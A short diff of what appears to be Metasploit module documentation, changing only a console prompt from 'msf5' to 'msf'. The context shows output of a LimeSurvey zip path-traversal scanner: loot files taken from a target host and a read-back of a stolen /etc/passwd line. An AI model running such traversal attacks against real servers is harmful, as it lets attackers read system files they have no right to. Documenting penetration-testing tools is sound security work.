@@ -120,7 +120,7 @@ resource (lime41.rb)> md5sum ~/.msf4/loot/*
 3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141208_default_2.2.2.2__407491.txt
 3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__149900.txt
 3cf5f3492b7c77a77f74124bb4ccb528  /home/h00die/.msf4/loot/20200408141209_default_2.2.2.2__611969.txt
-msf5 auxiliary(scanner/http/limesurvey_zip_traversals) > cat /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
+msf auxiliary(scanner/http/limesurvey_zip_traversals) > cat /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
 [*] exec: cat /home/h00die/.msf4/loot/20200408141207_default_2.2.2.2__164991.txt
 
 root:x:0:0:root:/root:/bin/bash
